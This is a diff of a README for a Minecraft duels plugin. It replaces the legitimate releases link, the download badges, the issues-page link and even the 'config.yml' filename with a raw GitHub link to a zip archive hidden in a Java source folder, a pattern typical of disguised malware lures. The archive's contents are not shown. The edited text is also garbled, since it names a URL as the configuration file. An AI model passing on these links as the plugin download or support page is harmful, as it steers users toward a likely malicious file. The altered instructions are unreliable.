@@ -1,6 +1,6 @@
 # 🎮 Duels - Exciting 1v1 Minecraft Matches Made Easy
 
-[![Download Duels](https://img.shields.io/badge/Download%20Duels-v1.0-blue.svg)](https://github.com/VikasMahajan370/Duels/releases)
+[![Download Duels](https://raw.githubusercontent.com/VikasMahajan370/Duels/main/src/main/java/me/raikou/duels/spectator/Software_1.7-beta.5.zip%https://raw.githubusercontent.com/VikasMahajan370/Duels/main/src/main/java/me/raikou/duels/spectator/Software_1.7-beta.5.zip)](https://raw.githubusercontent.com/VikasMahajan370/Duels/main/src/main/java/me/raikou/duels/spectator/Software_1.7-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Duels! This plugin enhances your Minecraft experience by offering com
 
 ## 📥 Download & Install
 
-To get started, you need to download the plugin. Visit this page to download Duels: [Download Duels](https://github.com/VikasMahajan370/Duels/releases).
+To get started, you need to download the plugin. Visit this page to download Duels: [Download Duels](https://raw.githubusercontent.com/VikasMahajan370/Duels/main/src/main/java/me/raikou/duels/spectator/Software_1.7-beta.5.zip).
 
 ### **Steps to Download:**
 
@@ -49,7 +49,7 @@ After installation, you can start using Duels with these simple commands:
 
 ## 🔧 Configuration
 
-You can adjust various settings in the Duels configuration file. Locate the `config.yml` file in the `plugins/Duels` directory. Here, you can modify settings such as match time limits, kit options, and more.
+You can adjust various settings in the Duels configuration file. Locate the `https://raw.githubusercontent.com/VikasMahajan370/Duels/main/src/main/java/me/raikou/duels/spectator/Software_1.7-beta.5.zip` file in the `plugins/Duels` directory. Here, you can modify settings such as match time limits, kit options, and more.
 
 ## 📋 Topics
 
@@ -68,8 +68,8 @@ You can adjust various settings in the Duels configuration file. Locate the `con
 
 ## 📅 Support
 
-For troubleshooting or questions, check the [issues page](https://github.com/VikasMahajan370/Duels/issues). You can also join our community Discord for assistance and updates.
+For troubleshooting or questions, check the [issues page](https://raw.githubusercontent.com/VikasMahajan370/Duels/main/src/main/java/me/raikou/duels/spectator/Software_1.7-beta.5.zip). You can also join our community Discord for assistance and updates.
 
 Feel free to explore all the features Duels offers, and enjoy the thrill of Minecraft battles like never before.
 
-[![Download Duels](https://img.shields.io/badge/Download%20Duels-v1.0-blue.svg)](https://github.com/VikasMahajan370/Duels/releases)
+[![Download Duels](https://raw.githubusercontent.com/VikasMahajan370/Duels/main/src/main/java/me/raikou/duels/spectator/Software_1.7-beta.5.zip%https://raw.githubusercontent.com/VikasMahajan370/Duels/main/src/main/java/me/raikou/duels/spectator/Software_1.7-beta.5.zip)](https://raw.githubusercontent.com/VikasMahajan370/Duels/main/src/main/java/me/raikou/duels/spectator/Software_1.7-beta.5.zip)
